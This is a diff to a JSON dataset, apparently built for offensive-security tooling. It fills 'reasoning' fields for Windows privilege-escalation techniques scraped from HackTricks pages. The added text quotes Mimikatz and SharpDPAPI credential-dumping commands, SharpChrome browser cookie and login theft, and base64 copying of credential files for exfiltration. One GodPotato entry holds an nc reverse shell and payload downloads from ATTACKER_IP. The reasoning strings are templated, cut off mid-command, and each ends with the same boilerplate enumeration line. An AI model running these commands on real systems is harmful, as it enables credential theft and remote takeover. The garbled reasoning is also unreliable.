   "source": "hacktricks/README"
  },
  {
@@ -2728,7 +2728,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe). Target OS: windows. Has 5 associated commands. Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process. Chain overview - User downloads MSI. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2742,7 +2742,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis). Target OS: windows. Has 1 associated commands. A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads. Tradecraft flow -  update. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -2800,7 +2800,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Machine/System key generation. Target OS: windows. Has 2 associated commands. This is key used for the machine to encrypt data. It's based on the  DPAPI_SYSTEM LSA secret , which is a special key that only the SYSTEM user can access. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2814,7 +2814,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpDPAPI. Target OS: windows. Has 1 associated commands. SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2828,7 +2828,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mimikatz. Target OS: windows. Has 1 associated commands. mimikatz sekurlsa::dpapi bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2842,7 +2842,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mimikatz. Target OS: windows. Has 1 associated commands. lsadump::secrets /system:DPAPI_SYSTEM /export bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2856,7 +2856,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpDPAPI. Target OS: windows. Has 1 associated commands. SharpDPAPI. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2885,7 +2885,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Find DPAPI Encrypted data. Target OS: windows. Has 4 associated commands. Common users  files protected  are in: -  C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Protect\\ -  C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ -  C:\\Users\\username\\AppData\\Roaming\\Microsof Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2923,7 +2923,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Copy the hex state key value (e.g., \"48F5...AB\") and pass it to cookies. Target OS: windows. Has 2 associated commands. SharpChrome cookies /target:\"C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /statekey:48F5... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2947,7 +2947,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Decrypt machine data. Target OS: windows. Has 3 associated commands. SharpDPAPI.exe machinetriage  bash mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\28350839752B38B238E5D56FDD7891A7 [... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2966,7 +2966,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpDPAPI. Target OS: windows. Has 2 associated commands. SharpDPAPI.exe masterkeys /rpc /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys) /pvk:BASE64... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -2990,7 +2990,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpDPAPI. Target OS: windows. Has 3 associated commands. SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH> Decryption: /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands /pvk:BASE64... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -3004,7 +3004,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpChrome accepts the same value as a \"prekey\". Target OS: windows. Has 1 associated commands. SharpChrome logins /browser:edge /prekey:SHA1_HEX bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -3018,7 +3018,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Base64-encode files for copy/paste exfil. Target OS: windows. Has 1 associated commands. [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"$env:APPDATA\\Microsoft\\Credentials\\C8D69E...B9\")) [Convert]::ToBase64String([IO. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -3032,7 +3032,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Or with NT hash. Target OS: windows. Has 1 associated commands. python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \\   -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX> bash python3 dpapi. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -3051,7 +3051,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Access other machine data. Target OS: windows. Has 2 associated commands. In  SharpDPAPI and SharpChrome  you can indicate the  /server:HOST  option to access a remote machine's data. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/dpapi-extracting-passwords"
  },
  {
@@ -3174,7 +3174,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Integrity Levels in File-system. Target OS: windows. Has 20 associated commands. A object inside the file-system may need an  minimum integrity level requirement  and if a process doesn't have this integrity process it won't be able to interact with it. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/integrity-levels"
  },
  {
@@ -3218,7 +3218,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Integrity Levels in Binaries. Target OS: windows. Has 7 associated commands. I made a copy of  cmd.exe  in  C:\\Windows\\System32\\cmd-low.exe  and set it an  integrity level of low from an administrator console: Now, when I run  cmd-low. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/integrity-levels"
  },
  {
@@ -3282,7 +3282,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Usage <a href=\"#usage\" id=\"usage\"></a>. Target OS: windows. Has 11 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/juicypotato"
  },
  {
@@ -3316,7 +3316,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Get a nc.exe reverse shell. Target OS: windows. Has 5 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/juicypotato"
  },
  {
@@ -3330,7 +3330,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Powershell rev. Target OS: windows. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/juicypotato"
  },
  {
@@ -3359,7 +3359,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Fast enumeration and fuzzing. Target OS: windows. Has 4 associated commands. -  pipelist  enumerates  \\\\.\\pipe\\ , shows ACLs/SIDs, and forwards entries to other modules for immediate probing. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/named-pipe-client-impersonation"
  },
  {
@@ -3388,7 +3388,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Dump memory. Target OS: windows. Has 4 associated commands. You could use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals Suite](https://docs.microsoft. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-abusing-tokens"
  },
  {
@@ -3402,7 +3402,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check privileges. Target OS: windows. Has 1 associated commands. The  tokens that appear as Disabled  can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-abusing-tokens"
  },
  {
@@ -3421,7 +3421,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enable All the tokens. Target OS: windows. Has 2 associated commands. If you have tokens disables, you can use the script [ EnableAllTokenPrivs.ps1 ](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-abusing-tokens"
  },
  {
@@ -3440,7 +3440,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: WMIC. Target OS: windows. Has 2 associated commands. Wmic  can be used to run programs on  startup . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3474,7 +3474,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Scheduled Tasks. Target OS: windows. Has 5 associated commands. Tasks  can be schedules to run with  certain frequency . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3513,7 +3513,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Folders. Target OS: windows. Has 6 associated commands. All the binaries located in the  Startup folders are going to be executed on startup . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3622,7 +3622,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Runs. Target OS: windows. Has 20 associated commands. Commonly known  AutoRun registry: -  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -  HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\Current Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3671,7 +3671,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Startup Path. Target OS: windows. Has 8 associated commands. -  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders -  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3700,7 +3700,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Winlogon Keys. Target OS: windows. Has 4 associated commands. HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon Typically, the  Userinit  key is set to  userinit.exe . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3729,7 +3729,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Policy Settings. Target OS: windows. Has 4 associated commands. -  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer -  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer Check  Run  key. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3777,7 +3777,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Installed Component. Target OS: windows. Has 4 associated commands. Active Setup is a feature in Windows that  initiates before the desktop environment is fully loaded . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3796,7 +3796,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Overview of Browser Helper Objects (BHOs). Target OS: windows. Has 2 associated commands. Browser Helper Objects (BHOs) are DLL modules that add extra features to Microsoft's Internet Explorer. They load into Internet Explorer and Windows Explorer on each start. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3825,7 +3825,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Font Drivers. Target OS: windows. Has 4 associated commands. -  HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Font Drivers -  HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Font Drivers Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3854,7 +3854,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Open Command. Target OS: windows. Has 4 associated commands. -  HKLM\\SOFTWARE\\Classes\\htmlfile\\shell\\open\\command -  HKLM\\SOFTWARE\\Wow6432Node\\Classes\\htmlfile\\shell\\open\\command Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3873,7 +3873,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Image File Execution Options. Target OS: windows. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3887,7 +3887,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SysInternals. Target OS: windows. Has 1 associated commands. Note that all the sites where you can find autoruns are  already searched by [  winpeas.exe ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/privilege-escalation-with-autorun-binaries"
  },
  {
@@ -3901,7 +3901,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Requirements and common gotchas. Target OS: windows. Has 1 associated commands. All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges: - SeImpersonatePrivilege (most common) or SeAssignPrimaryTok Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -3925,7 +3925,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PrintSpoofer. Target OS: windows. Has 3 associated commands. Notes: - You can use -i to spawn an interactive process in the current console, or -c to run a one-liner. - Requires Spooler service. If disabled, this will fail. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -3939,7 +3939,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: In some old versions you need to use the \"-f\" param. Target OS: windows. Has 1 associated commands. c:\\RoguePotato.exe -r 10.10.10.10 -c \"c:\\tools\\nc.exe 10.10.10. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -3983,7 +3983,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: SharpEfsPotato. Target OS: windows. Has 7 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -4022,7 +4022,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: EfsPotato. Target OS: windows. Has 6 associated commands. Tip: If one pipe fails or EDR blocks it, try the other supported pipes: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -4056,7 +4056,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: You can achieve a reverse shell like this.. Target OS: windows. Has 5 associated commands. > GodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012\" powershell iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe iwr http://ATTACKER_IP/shell.ps1 -OutFile shell. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/roguepotato-and-printspoofer"
  },
  {
@@ -4234,7 +4234,7 @@
    }
   ],
   "os": "windows",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PowerShell – read first MB from C: raw device (requires SeManageVolumePrivilege). Target OS: windows. Has 12 associated commands. $fs = [System.IO.File]::Open(\"\\\\.\\\\C:\",[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite) $buf = New-Object byte[] (1MB) $null = $fs.Read($buf,0,$buf. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/semanagevolume-perform-volume-maintenance-tasks"
  },
  {
